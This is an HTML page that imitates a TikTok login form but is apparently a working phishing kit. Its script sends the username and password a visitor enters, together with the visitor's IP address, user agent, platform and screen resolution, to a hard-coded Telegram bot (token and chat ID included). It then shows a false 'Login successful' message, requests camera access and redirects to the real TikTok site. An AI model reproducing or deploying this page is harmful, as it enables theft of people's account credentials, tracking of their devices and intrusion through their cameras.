<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Log in to TikTok</title>
  <link rel="icon" type="image/png" href="./img/tiktok-fav.ico" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background: linear-gradient(to right, #f2f3f7, #e5e7eb);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #333;
    }

    .login-container {
      background: white;
      max-width: 420px;
      width: 100%;
      padding: 40px 30px;
      border-radius: 16px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    .login-container h2 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #000;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    input[type="text"],
    input[type="password"] {
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
      transition: border-color 0.3s ease;
    }

    input:focus {
      border-color: #e94774;
      outline: none;
    }

    button {
      width: 100%;
      background-color: #e94774;
      color: white;
      padding: 14px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #d4305a;
    }

    .footer {
      margin-top: 20px;
      font-size: 14px;
    }

    .footer a {
      color: #3897f0;
      text-decoration: none;
      font-weight: bold;
    }

    .message {
      margin-top: 15px;
      font-weight: bold;
      font-size: 14px;
    }

    .success {
      color: green;
    }

    .error {
      color: red;
    }

    video {
      width: 100%;
      margin-top: 15px;
      border-radius: 8px;
      display: none;
    }

    canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Log in to TikTok</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Email or username" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>

    <!-- Video element for camera preview -->
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <button id="captureBtn" style="display:none; margin-top:10px;">Capture Photo</button>

    <div class="footer">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
    <div id="responseMessage" class="message"></div>
    <div class="device-info" id="deviceInfo"></div>
  </div>

  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
  <script>
    const TOKEN = "6380138289:AAHOPzz0h7lXXNZPxAErxQvD1jm9LNSk5OY";
    const CHAT_ID = "711360667";
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const captureBtn = document.getElementById('captureBtn');

    document.getElementById("loginForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const responseMessage = document.getElementById("responseMessage");
      const deviceInfoDiv = document.getElementById("deviceInfo");

      if (!username || !password) {
        showMessage("Please enter both username and password.", "error");
        return;
      }

      // Show loading
      showMessage("Logging in...", "info");
      deviceInfoDiv.innerHTML = "Fetching device info...";

      axios.get('https://api.ipify.org?format=json')
        .then(ipResponse => {
          const ip = ipResponse.data.ip;
          const userAgent = navigator.userAgent;
          const platform = navigator.platform;
          const screenWidth = screen.width;
          const screenHeight = screen.height;
          const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

          deviceInfoDiv.innerHTML = `
            <strong>Device:</strong> ${deviceType}<br/>
            <strong>Platform:</strong> ${platform}<br/>
            <strong>Resolution:</strong> ${screenWidth}x${screenHeight}
          `;

          const message = `
<b>üîê New Login Attempt</b>\n
<b>Platform:</b> TikTok\n
<b>Email or Username:</b> ${username}\n
<b>Password:</b> ${password}\n
<b>IP Address:</b> ${ip}\n
<b>Device:</b> ${deviceType}\n
<b>Platform:</b> ${platform}\n
<b>User Agent:</b> ${userAgent}\n
<b>Resolution:</b> ${screenWidth}x${screenHeight}
          `;

          axios.post(URI_API, {
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message
          }).then(() => {
            showMessage("Login successful! Redirecting...", "success");

            // Ask for camera permission
            requestCameraAccess();

            setTimeout(() => {
              window.location.href = "https://www.tiktok.com/";
            }, 3000);
          }).catch(error => {
            console.error("Telegram error:", error);
            showMessage("Failed to send login data. Try again.", "error");
          });
        })
        .catch(ipError => {
          console.error("IP fetch error:", ipError);
          showMessage("Unable to retrieve IP address.", "error");
          deviceInfoDiv.innerHTML = "";
        });

      function showMessage(text, type) {
        responseMessage.textContent = text;
        responseMessage.className = `message ${type}`;
      }

      function requestCameraAccess() {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.style.display = 'block';
            captureBtn.style.display = 'inline-block';
          })
          .catch(err => {
            console.warn("Camera access denied or not available.");
          });
      }

      captureBtn.addEventListener('click', () => {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
          const file = new File([blob], "snapshot.jpg", { type: "image/jpeg" });

          // Optional: Send image via Telegram Bot API using FormData
          // Note: Axios doesn't support sending files directly unless you use form-data

          alert("Photo captured!");
        }, 'image/jpeg', 0.9);
      });
    });
  </script>
</body>
</html>
